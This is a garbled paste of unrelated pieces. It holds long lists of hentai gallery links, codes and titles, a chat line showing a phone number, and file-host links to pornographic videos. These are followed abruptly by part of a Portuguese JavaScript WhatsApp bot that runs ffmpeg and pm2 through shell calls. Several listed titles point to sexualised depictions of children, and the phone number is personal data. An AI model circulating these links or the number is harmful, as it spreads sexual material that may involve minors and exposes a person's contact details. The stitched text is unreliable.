https://nhentai.net/g/271726/
https://nhentai.net/g/271667/
https://nhentai.net/g/267352/
https://nhentai.net/g/152968/
https://nhentai.net/g/238876/
https://nhentai.net/g/116395/
https://nhentai.net/g/84809/
https://nhentai.net/g/211656/
-
https://nhentai.net/g/272117/
https://nhentai.net/g/188721/
https://nhentai.net/g/266402/
https://nhentai.net/g/238876/
[8/6 10.48] +62 812-8025-1698: Happy Mother's Day 165310,177978,211759,212643,229540, 250029,211519,256097,163478, 91505, 79280, 260629,128051,121972,261633,172044,119055,208323,149942,161236, 177150,233766,97949,230107 ,175822, 213545,232837,179166,138603,130183, 173543,234642,268015,228293,268893, 239536, yg suka mamah
Aleatória
 257892 226942 236297 216039 221711 245304 166174 175220 244327 191049 220882 244859 227446 259328 259532 259634 259610 259348 258669 256097 118282 260028 260058 259557 259497 122220 260111 260088 259880 258977 260097 259765 259359 260138 259617 107965 197255 260276 260209 260210 260203 191360 191390 248933 257567 227913 211648 210240 260626 259622 257991 213966 260623 149112 257168 198203 114783 220958 244387 243734 223315 118069 136188 260686 241777  260912 142154 119798 261174 258301 256808 169134 220354 260271 261725 261378 252174 261928 114427 187003 147577 249458 157767 224316 175294 258450 233864 236128 261162 174036 187205 210873 193318 110232 199310 193816 220376 193814 193815 219068 220386 177642 188269 181837 220377 119293 257528 258926 262384 105951 259904 208174 249229 245644 262538 234818 216845 149212 134442 135927 262447 261811 261650 261225 261226 260761 250327 192327 167801 150309 123554
 https://www2.zippyshare.com/d/z9dcY6Nr/791216/%5bNekoPoi%5d_Akina_to_Onsen_de_H_Shiyo%5b360P%5d%5bnekopoi.care%5d.mp4
 https://www4.zippyshare.com/d/j7PFLGUY/946757/%5bNekoPoi%5d_Tsuma_ga_Kirei_ni_Natta_Wake_-_02_%5b360P%5d_%5bnekopoi.care%5d.mp4
 https://www111.zippyshare.com/d/EK5uqIMh/566060/%5bNekoPoi%5d_Megane_no_Megami_-_01_%5b360P%5d_%5bnekopoi.care%5d.mp4
 https://www109.zippyshare.com/d/2ebALhhS/463654/%5bNekoPoi%5d_Watashi_ga_Toriko_-_02%5b360P%5d%5bnekopoi.care%5d.mp4
 https://www115.zippyshare.com/d/LmzOkRAI/313299/%5bNekoPoi%5d_Chichi-iro_Toiki_-_01_%5b360P%5d%5bnekopoi.care%5d.mp4
 https://www89.zippyshare.com/d/SgEHvrJs/42812/%5bNekoPoi%5d_Chichi-iro_Toiki_-_02_%5b360P%5d%5bnekopoi.care%5d.mp4
 https://www66.zippyshare.com/d/j0ivbciL/520411/%5bNekoPoi%5d_Onna_Maou_Melissa_no_H_na_Boukenki_-_01_%5b360P%5d_%5bnekopoi.care%5d.mp4
 https://www71.zippyshare.com/d/M225YIrR/535656/%5bNekoPoi%5d_Buta_no_Gotoki_Sanzoku_ni_Torawarete_Shojo_wo_Ubawareru_Kyonyuu_Himekishi_Onna_Senshi_-_01%5b360P%5d%5bnekopoi.care%5d.mp4
 https://www49.zippyshare.com/d/bdwYjaXS/605790/%5bNekoPoi%5d_Akebi_no_Hana___Maho_-_01_%5b360P%5d_%5bnekopoi.pro%5d.mp4
 
 ● CODIGO NUCLEAR ●
‌229144 253687 238577 236509
‌227675 229085 233245 266177
254351 265855 239842 219847
239749 230566 253104 230185
251974 253091 251489 238030
260614 245023 232887 233547
262158 262870 239312 255129
244530 246963 256050 215459
243725 233770 250704 261819
261830 215658 256404 260028
261789 241254 268580 262407
262252 201814 250193 236036
262889 243933 245697 239750
128983 95364 223815 225080
110332 225767 97247 231139
266116 217037 160657 182439
205089 176495 199121 199425
184068 186615 224644 129479
251524 153374 146499 258212
163532 255244 269825 235914
247103 138365 124624 219718
168941 265918 205995 191390
‌225496 259137 231681 161688
‌199613 259260 260433 235532 
‌88323 272117 170213 256613
‌258382 224942
/g/181556/ - Fudeoro Sisters
/g/152456/ - Mou Teitoku No Soba 
/g/167936/ - Inma Mo Mikata
/g/139048/ - shojo soushitsu
/g/185592/ - Gensoukyou Rakuenka Keikaku 11
/g/191427/ - Kousei Iinkai
/g/175015/ - Sister Breeder
/g/142825/ - A Certain Village
/g/182290/ - A hero taken prisoner
/g/192845/ - Toaru Natsu
/g/192849/ - Toaru Fuyu
/g/183099/ - Adolescent calculation
/g/192143/ - Blonde no koigokoro
/g/142825/ - Toaru mura no Fudeoroshi Jijou
/g/153856/ - Tenryuu Onee-chan fo naisho no Yasen Enshuu!!
/g/158404/ - Kusogaki
/g/136026/ - Megaflower x flower
/g/188918/ Kodomo no Ecchi
/g/193876/ - Razoku no Yoru
/g/193984/ - Houkago Rendezvous
/g/76119/ - Broadcast Girlfriend
/g/192874/ - Koyomi Fechi
/g/107180/ - Harem Bukai no Boku
/g/110900/ - Kiniro
/g/135193/ - It's my win!
/g/161488/ - Shota Teitoku to Nyuukyo Time
/g/65433/ - Jirettai no Yo!
/g/182327/ - Sakeno Seiton
/g/78651/ -  Harem Time
/g/190230/ - Boku no Bimama
/g/191880/ - Sanae Hamaru
/g/180600/ - Sakaki-san Satisfaction
/g/105465/ - Sakaki-san Franchise
/g/173023/ - Tiny Evil
/g/191049/ - Kono Suba 1
/g/191851/ - Kono Suba 2
/g/167112/ - i'll be your cat
/g/177754/ - Sloppy Sister
/g/187016/ - Nanyou no Vacances Sakusen
/g/165961/ - Love-ridden
/g/165962/ - Pandemonium
/g/97879/  - Natsuyasumi
/g/74500/ - Nee-chan no yobanaide
/g/133435/ - Spirited Girl
/g/152075/ - Trick And Treat
/g/174888/ - Razoku No Yoru
/g/93354/ - Melty Play
/g/74076/ - BAD COMMUNICATION
/g/122948/ - PLAY BACK
/g/104346/ - Funky Glamourous
/g/91773/ - Good Times!!
/g/78226/ - Practice Game
/g/76482/ - JOINT
/g/68508/ -  Kimi ga iru nara
/g/61224/ - Way back to the future
/g/60473/ - Hoshi ni negai o
/g/58469/ - Splash
/g/56295/ - Heat Island
/g/53905/ - I Beg You
/g/42383/ - Rumors
/g/187611/ - My Dear Maid
/g/190846/ - Tsukimi Dango
/g/158050/ - Muchimuchi
/g/83269/ - Only a taste for Onee-Chan
/g/146042/ - Bismarck wa Shounen Teitoku kara Seifuku
/g/178941/ - Kodomo-Sensei
/g/100401/ - Sister paradise
/g/35240/ - Eiken Lovers
/g/77415/ - Koinaka
/g/190900/ - Grazero Fantasy
/g/161819/ - Night Of Incest
/g/151132/ - Pet Na Ane No Shitsukekata
/g/147585/ - Anetsun Summer!
/g/136908/ - Man x Koi
/g/112907/ - Imouto x Swimming!
/g/125392/ - Joubutsu!
/g/174463/ - Hotizuma Miyuki-San
/g/159290/ - Mister Mistake
/g/137953/ - Hotondo Byouki
 /g/114053/ - Unknown Title 
 /g/78818/ - Furofuro!
 /g/15055/ - Demodori Mama
 /g/39876/ - Cherry Break
 /g/191427/ - Doutei Danshi Kousei Iinkai
 /g/192695/ - Costte Asobo.
 /g/192330/ - Level 1
 /g/191320/ - Kimi Ni Nara Dekiru
 /g/164434/ - MIDNIGHT PRINCESS
 /g/76813/ - Superior Cake
 /g/148669/ - Ohime-sama Gokko
 /g/144806/ - Youkai Watching
 /g/163698/ - Escalation
 /g/158559/ - Jiyuu de Kimama na Ore no Imouto
 /g/182210/ - Hatsujou Days
 /g/131428/ - Having Fun With The One That I Love
 /g/112853/ - Boku to Oneesan no Naisho
 /g/178594/ - Imouto no Oppai ga Marudashi Datta Hanashi 1
 /g/195665/ - Imouto no Oppai ga Marudashi Datta Hanashi 2
 /g/195092/ - Imouto no Oppai ga Marudashi Datta Hanashi 3
 /g/195093/ - Imouto no Oppai ga Marudashi Datta Hanashi 4
 
 229144 253687 238577 236509
 ‌227675 229085 233245 266177
 254351 265855 239842 219847
 239749 230566 253104 230185
 251974 253091 251489 238030
 260614 245023 232887 233547
 262158 262870 239312 255129
 244530 246963 256050 215459
 243725 233770 250704 261819
 261830 215658 256404 260028
 261789 241254 268580 262407
 262252 201814 250193 236036
 262889 243933 245697 239750
 128983 95364 223815 225080
 110332 225767 97247 231139
 266116 217037 160657 182439
 205089 176495 199121 199425
 184068 186615 224644 129479
 251524 153374 146499 258212
 163532 255244 269825 235914
 247103 138365 124624 219718
 168941 265918 205995 191390
 ‌225496 259137 231681 161688
 ‌199613 259260 260433 235532
 ‌88323 272117 170213 256613
 ‌258382 224942 281261
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  ● Milf ●
165310,177978,211759,212643,229540, 250029,211519,256097,163478, 91505, 79280, 260629,128051,121972,261633,172044,119055,208323,149942,161236, 177150,233766,97949,230107 ,175822, 213545,232837,179166,138603,130183, 173543,234642,268015,228293,268893, 239536, yg suka mamah
/g/181556/ - Fudeoro Sisters
/g/152456/ - Mou Teitoku No Soba
/g/167936/ - Inma Mo Mikata
/g/139048/ - shojo soushitsu
/g/185592/ - Gensoukyou Rakuenka Keikaku 11
/g/191427/ - Kousei Iinkai
/g/175015/ - Sister Breeder
/g/142825/ - A Certain Village
/g/182290/ - A hero taken prisoner
/g/192845/ - Toaru Natsu
/g/192849/ - Toaru Fuyu
/g/183099/ - Adolescent calculation
/g/192143/ - Blonde no koigokoro
/g/142825/ - Toaru mura no Fudeoroshi Jijou
/g/153856/ - Tenryuu Onee-chan fo naisho no Yasen Enshuu!!
/g/158404/ - Kusogaki
/g/136026/ - Megaflower x flower
/g/188918/ Kodomo no Ecchi
/g/193876/ - Razoku no Yoru
/g/193984/ - Houkago Rendezvous
/g/76119/ - Broadcast Girlfriend
/g/192874/ - Koyomi Fechi
/g/107180/ - Harem Bukai no Boku
/g/110900/ - Kiniro
/g/135193/ - It's my win!
/g/161488/ - Shota Teitoku to Nyuukyo Time
/g/65433/ - Jirettai no Yo!
/g/182327/ - Sakeno Seiton
/g/78651/ - Harem Time
/g/190230/ - Boku no Bimama
/g/191880/ - Sanae Hamaru
/g/180600/ - Sakaki-san Satisfaction
/g/105465/ - Sakaki-san Franchise
/g/173023/ - Tiny Evil
/g/191049/ - Kono Suba 1
/g/191851/ - Kono Suba 2
/g/167112/ - i'll be your cat
/g/177754/ - Sloppy Sister
/g/187016/ - Nanyou no Vacances Sakusen
/g/165961/ - Love-ridden
/g/165962/ - Pandemonium
/g/97879/ - Natsuyasumi
/g/74500/ - Nee-chan no yobanaide
/g/133435/ - Spirited Girl
/g/152075/ - Trick And Treat
/g/174888/ - Razoku No Yoru
/g/93354/ - Melty Play
/g/74076/ - BAD COMMUNICATION
/g/122948/ - PLAY BACK
/g/104346/ - Funky Glamourous
/g/91773/ - Good Times!!
/g/78226/ - Practice Game
/g/76482/ - JOINT
/g/68508/ - Kimi ga iru nara
/g/61224/ - Way back to the future
/g/60473/ - Hoshi ni negai o
/g/58469/ - Splash
/g/56295/ - Heat Island
/g/53905/ - I Beg You
/g/42383/ - Rumors
/g/187611/ - My Dear Maid
/g/190846/ - Tsukimi Dango
/g/158050/ - Muchimuchi
/g/83269/ - Only a taste for Onee-Chan
/g/146042/ - Bismarck wa Shounen Teitoku kara Seifuku
/g/178941/ - Kodomo-Sensei
/g/100401/ - Sister paradise
/g/35240/ - Eiken Lovers
/g/77415/ - Koinaka
/g/190900/ - Grazero Fantasy
/g/161819/ - Night Of Incest
/g/151132/ - Pet Na Ane No Shitsukekata
/g/147585/ - Anetsun Summer!
/g/136908/ - Man x Koi
/g/112907/ - Imouto x Swimming!
/g/125392/ - Joubutsu!
/g/174463/ - Hotizuma Miyuki-San
/g/159290/ - Mister Mistake
/g/137953/ - Hotondo Byouki
/g/114053/ - Unknown Title 
/g/78818/ - Furofuro!
/g/15055/ - Demodori Mama
/g/39876/ - Cherry Break
/g/191427/ - Doutei Danshi Kousei Iinkai
/g/192695/ - Costte Asobo.
/g/192330/ - Level 1
/g/191320/ - Kimi Ni Nara Dekiru
/g/164434/ - MIDNIGHT PRINCESS
/g/76813/ - Superior Cake
/g/148669/ - Ohime-sama Gokko
/g/144806/ - Youkai Watching
/g/163698/ - Escalation
/g/158559/ - Jiyuu de Kimama na Ore no Imouto
/g/182210/ - Hatsujou Days
/g/131428/ - Having Fun With The One That I Love
/g/112853/ - Boku to Oneesan no Naisho
/g/178594/ - Imouto no Oppai ga Marudashi Datta Hanashi 1
/g/195665/ - Imouto no Oppai ga Marudashi Datta Hanashi 2
/g/195092/ - Imouto no Oppai ga Marudashi Datta Hanashi 3
/g/195093/ - Imouto no Oppai ga Marudashi Datta Hanashi 4
/g/183714/ - Mating With Oni 1
/g/181008/ - Mating With Oni 2
/g/176948/ - Gal Shota Cinderella 1
/g/178511/ - Gal Shota Cinderella 2
/g/185653/ - Gal Shota Cinderella 3
/g/137236/ - Mika-ppoi no! 1
/g/144128/ - Mika-ppoi no! 2
/g/3508/ - Shounen Teikoku 1
/g/3509/ -Shounen Teikoku 2
/g/3510/ - Shounen Teikoku 3
/g/3511/ - Shounen Teikoku 5''
/g/3512/ -Shounen Teikoku 5
/g/3262/ Shounen Teikoku 6
/g/3466/ - Shounen Teikoku 7
/g/2598/ - Shounen Teikoku 8
/g/8196/ - Shounen Teikoku 9
/g/185406/ - Ane Zukushi 1-11
/g/188848/ - Perfect Half (long)
[13/8 17.26] Ordinary Guy: 198964 Countryside 
104436 Mismatched Thoughts
213681 Cultivating Bigger Pleasure
242460 Bokujou: Happy End
255869 Today, Surely
116018 Kahanshin No Otsukiai
165310 Suki Suki! Okaa-san
187047 Shirasaka Koume To No Kankei
116272 Akiko-san To Issho
274000 Hame Kama
93335 Henkano 
165961 Love-Ridden 
250500 Koishi-chan No Bitch Na Hon
264061 Idol Refle Sex
110896 Uchi No Imouto Ga Sukoshi Kawaii
187095 Nuki & Koki
32591 Kosu Tora
151436 FuckBuddy Collection
231188 Minatsu's Fault
275485 Nurunuru Deriheru
275306 Sweet Whispers
205199 Most Distant Neighbor
274796 The Drunk Mouth Of My Neighbor
274412 Kyousei Zecchou Batsu Game
71646 Otonashi Kotorisan
273719 Oshiri Ai
273849 Strength and III
120744 PuniKano
172759 Dogful Days
273337 I Will Serve You Tonight
273132 Watanabe's Day Off
273222 Koukando Analyze!
272129 Dog & Cat Roleplay
271958 Enemy Girl
271892 Poolside Reward
217727 Uruka-chan To Ichaicha Shitai!
271431 Toshoshitsu O Shimete Kara
271282 Hidden Quest
270752 Natsu Ni   Ecc
  ● Random ●
257892 226942 236297 216039 221711 245304 166174 175220 244327 191049 220882 244859 227446 259328 259532 259634 259610 259348 258669 256097 118282 260028 260058 259557 259497 122220 260111 260088 259880 258977 260097 259765 259359 260138 259617 107965 197255 260276 260209 260210 260203 191360 191390 248933 257567 227913 211648 210240 260626 259622 257991 213966 260623 149112 257168 198203 114783 220958 244387 243734 223315 118069 136188 260686 241777  260912 142154 119798 261174 258301 256808 169134 220354 260271 261725 261378 252174 261928 114427 187003 147577 249458 157767 224316 175294 258450 233864 236128 261162 174036 187205 210873 193318 110232 199310 193816 220376 193814 193815 219068 220386 177642 188269 181837 220377 119293 257528 258926 262384 105951 259904 208174 249229 245644 262538 234818 216845 149212 134442 135927 262447 261811 261650 261225 261226 260761 250327 192327 167801 150309 123554
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
     ● yg suka onee san ●
189833 12386 232747 186250 200330 63009 202662 66435 145071 6290 185596 121963 67356 157649 230109 243886 172138 126145 253850 144121 166315 197350 2611 19157 247791 239595 50074 1235 135474 258965 262816 195747 242247 252913 149760 139983 114692 151132 152089 144481 201031 169585 198203 240330 236896 88670 254499 169585 196783 194443 59284 249265 62287
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━281917
COLETA DE CÓDIGO NUCLEAR
270576
213340
237210/3
184644/
184212/
237987/
238657/
183994/5/
Nhentai.net/g/244044/5/
Nhentai.net/g/183603/
nhentai.net/g/189103/
Nhentai.net/g/183773/8/
Nhentai.net/g/271709/
Nhentai.net/g/271074 Kemonomimi Milf
Nhentai.net/g/270424 Atago Azurlane
Nhentai.net/g/236554 Kemonomimi Half Horse
Nhentai.net/g/238151 kemonomimi final fantasy
Nhentai.net/g/269354 kemono friends
Nhentai.net/g/239567 Cowgirl 
Nhentai.net/g/227556 Bird Girl
Nhentai.net/g/226184 Neko
Nhentai.net/g/225422 Racoon
Nhentai.net/g/268918 Lolikitsune
Nhentai.net/g/235660 Fox
‌229144 253687 238577 236509
‌227675 229085 233245 266177
254351 265855 239842 219847
239749 230566 253104 230185
251974 253091 251489 238030
260614 245023 232887 233547
262158 262870 239312 255129
244530 246963 256050 215459
243725 233770 250704 261819
261830 215658 256404 260028
261789 241254 268580 262407
262252 201814 250193 236036
262889 243933 245697 239750
128983 95364 223815 225080
110332 225767 97247 231139
266116 217037 160657 182439
205089 176495 199121 199425
184068 186615 224644 129479
251524 153374 146499 258212
163532 255244 269825 235914
247103 138365 124624 219718
168941 265918 205995 191390
‌225496 259137 231681 161688
‌199613 259260 260433 235532
‌88323 272117 170213 256613
‌258382 224942
https://nhentai.net/g/192237/ Watashi to
https://nhentai.net/g/134318/ Watashi no Onii-chan 1
https://nhentai.net/g/165279/ Watashi no Onii-chan 2
https://nhentai.net/g/164114/ Watashi no Onii-chan 3
https://nhentai.net/g/192347/ Watashi no Onii-chan 4
https://nhentai.net/g/209026/ Cocologic
https://nhentai.net/g/207432/ Watashi no Onii-chan 4,5
https://nhentai.net/g/247574/ Watashi no Onii-chan Extra `
reply(textmenu)
case 'simi': 
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (args.length < 1) return reply(`Use ${prefix}simi texto`)
try { 
anu = await fetchJson(`https://simsumi.herokuapp.com/api?text=${encodeURIComponent(body.slice(5))}`, {method: 'get'})
if (anu.error) return reply('Não sei ler o que não existe 🐤 (converse cmg)')
loli.sendMessage(from, `${anu.success} 🐤`, text, {quoted: mek})
} catch {
reply(ptbr.erro)
}
break 

case 'macumba':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
pedido = body.slice(8)
buf = fs.readFileSync(`./src/macu.mp4`)
loli.sendMessage(from, buf, video, {quoted: say1})
break

/*case 'boc': 
addFilter(from)
//if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
//if (!isRegistered) return reply(mess.only.akumagayb)
//if (!isOwner) return reply(ptbr.ownerB())
//const horatt = moment.tz('America/Sao_Paulo').//format('HH:mm')//
//const horaAtual = `${horatt}`//
//if (/*horaAtual == '08:42' && *///ammOff == "off" && isGroup) {//
//const aMimirMp3 = fs.readFileSync('./database/audios/acorda.mp3')
//const aMimirSt = fs.readFileSync('./database/figurinhas/sonic.webp')//
//for (let _ of groupMembers) {//
//loli.sendMessage(_.jid, aMimirMp3, MessageType.audio, {mimetype: 'audio/mp4',ptt:true})//
//loli.sendMessage(_.jid, aMimirSt, sticker)//
//}//
//ammOff = "on"
//} else if(/*horaAtual != '08:42' && *///ammOff == "on")//{//
//ammOff = "off"
//}
//break//
					
case 'addxp': 
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isOwner) return reply(`te fuder maluco nem meu dono você é`)
if (!isGroup) return reply(ptbr.group())
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return 
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = `Foi adicionado ${args[1]} em xp para @${mentioned[0].split('@')[0]}`
mentions(`${susp}`, mentioned, true)
addLevelingXp(pru, Number(args[1]))                     
break

case 'pão': 
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (isOwner) return reply(`Oi ${pushname}`)
else {
reply('Oi membro comum')
}
break 

case 'donogp':
case 'ownergroup':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing) 
options = {
text: `Dono do grupo: @${from.split("-")[0]}`,
contextInfo: { mentionedJid: [from]}}
loli.sendMessage(from, options, text, { quoted: say1 } )
break

case 'gatinho': 
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
reply(ptbr.wait())
try {
axios.get(`https://nekos.life/api/v2/img/meow`).then((res)=>{
imageToBase64(res.data.url).then((response) => {var buf = Buffer.from(response, 'base64');
loli.sendMessage(from, buf, image, {quoted: say1,caption: "🐱"})
})})
} catch (e) {
console.log(`Error :`, color(e,'red'))
reply('❌ocorreu um erro❌\n\nTente novamente. ')
}
break

case 'reiniciar': 
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isOwner) return reply('somente meu criador')
npm = `pm2 start 0`
loli.sendMessage(from, "Aguarde, Estou Reiniciando...", text)
loli.sendMessage(sender, "Bot iniciado", text)
exec(npm, (err, stdout) => {
if(err) return loli.sendMessage(from, "Erro", text, {quoted: mek})
if (stdout) {
loli.sendMessage(from, stdout, text, {quoted: say1})
} 
})
break
 
//_CONTADOR DE LETRAS
case 'contar': 
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (args.length == 0) return reply( '0 caracteres, pois obviamente não há texto😀')
const count = body.slice(8).length
if (count === 1) {
reply(`O texto possui ${count} caractere.`)
} else if (count > 1) {
reply(`O texto possui ${count} caracteres.`)
}
break

//_COMANDO (RR) EM TESTES
case 'rr': 
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
rate = body.slice(1)
ratee = ["Tac... Não disparou","Tac... Não disparou,ainda...","Tac💥 Disparou e você morreu","Tac💥Disparou mas a bala pegou de raspão","A arma falhou","Tac... Por pouco que não dispara...","Tac... A arma estava descarregada"]
const cu = ratee[Math.floor(Math.random() * ratee.length)]
loli.sendMessage(from, ''+ cu+'', text, { quoted: say1 })
break
//_FIM DO COMANDO (RR)

//_EFEITO REVERSE PARA VIDEO  
case 'reversevid': 
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isvipp) return reply('Você não é um Membro Vip, entre em contato com o proprietário ou digite *.buyvip* para comprar acesso Vip!')
if (!isQuotedVideo) return reply('Marque um vídeo')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
media = await loli.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return reply(`Err: ${err}`)
buffer453 = fs.readFileSync(ran)
loli.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: say1 })
fs.unlinkSync(ran)
})
break
		
//_EFEITO FAST PARA VIDEO  
case 'fastvid': 
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isvipp) return reply('Você não é um Membro Vip, entre em contato com o proprietário ou digite *.buyvip* para comprar acesso Vip!')
if (!isQuotedVideo) return reply('Marque um vídeo')
reply(ptbr.wait())
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
media = await loli.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return reply(`Err: ${err}`)
buffer453 = fs.readFileSync(ran)
loli.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: say1 })
fs.unlinkSync(ran)
})		
break
		
//_EFEITO SLOW PARA VIDEO  
case 'slowvid': 
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isvipp) return reply('Você não é um Membro Vip, entre em contato com o proprietário ou digite *.buyvip* para comprar acesso Vip!')
if (!isQuotedVideo) return fakegroup('Marque um vídeo')
reply(ptbr.wait())
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
media = await loli.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return fakegroup(`Err: ${err}`)
buffer453 = fs.readFileSync(ran)
loli.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: say1 })
fs.unlinkSync(ran)
})
break

//_EFEITO NIGHTCORE PARA AUDIO         
case 'nightcore':  
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isvipp) return reply('Você não é um Membro Vip, entre em contato com o proprietário ou digite *.buyvip* para comprar acesso Vip!')
if (!isQuotedAudio) return reply('Marque um áudio')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await loli.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a atempo=1.06,asetrate=44100*1.25 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
loli.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: say1})
fs.unlinkSync(ran)
})
break   

//_EFEITO SLOW PARA AUDIO
case 'slow': 
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isvipp) return reply('Você não é um Membro Vip, entre em contato com o proprietário ou digite *.buyvip* para comprar acesso Vip!')
if (!isQuotedAudio) return reply('Marque um áudio')
low = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
slo = await loli.downloadAndSaveMediaMessage(low)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${slo} -filter:a "atempo=0.9,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(slo)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
loli.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: say1})
fs.unlinkSync(ran)
})
break

//_EFEITO ESQUILO PARA AUDIO
case 'esquilo': 
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isvipp) return reply('Você não é um Membro Vip, entre em contato com o proprietário ou digite *.buyvip* para comprar acesso Vip!')
if (!isQuotedAudio) return reply('Marque um áudio')
pai = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
tup = await loli.downloadAndSaveMediaMessage(pai)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${tup} -filter:a "atempo=0.7,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(tup)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
loli.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: say1})
fs.unlinkSync(ran)
})
break

//_EFDEITO GIGANTE PARA AUDIO	
case 'gemuk': 
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isvipp) return reply('Você não é um Membro Vip, entre em contato com o proprietário ou digite *.buyvip* para comprar acesso Vip!')
if (!isQuotedAudio) return reply('Marque um áudio')
muk = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
gem = await loli.downloadAndSaveMediaMessage(muk)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
loli.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: say1})
fs.unlinkSync(ran)
})
break

//_DEIXA O AUDIO RÁPIDO
case 'fast': 
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isvipp) return reply('Você não é um Membro Vip, entre em contato com o proprietário ou digite *.buyvip* para comprar acesso Vip!')
if (!isQuotedAudio) return reply('Marque um áudio')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await loli.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a "atempo=0.9,asetrate=95100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Erro')
hah = fs.readFileSync(ran)
loli.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: say1})
fs.unlinkSync(ran)
})
break

//_AUMENTA O BASS DE UM AUDIO	
case 'bass': 
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isvipp) return reply('Você não é um Membro Vip, entre em contato com o proprietário ou digite *.buyvip* para comprar acesso Vip!')
if (!isQuotedAudio) return reply('Marque um áudio')
ass = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
bas = await loli.downloadAndSaveMediaMessage(ass)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${bas} -af equalizer=f=20:width_type=o:width=2:g=15 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(bas)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
loli.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: say1})
fs.unlinkSync(ran)
})
break

//_DEIXA O AUDIO ESTOURADO		
case 'earrape': 
case 'estourar':       
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isvipp) return reply('Você não é um Membro Vip, entre em contato com o proprietário ou digite *.buyvip* para comprar acesso Vip!')
if (!isQuotedAudio) return reply('Marque um áudio')
ass = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
bas = await loli.downloadAndSaveMediaMessage(ass)
ran = getRandom('.mp3')
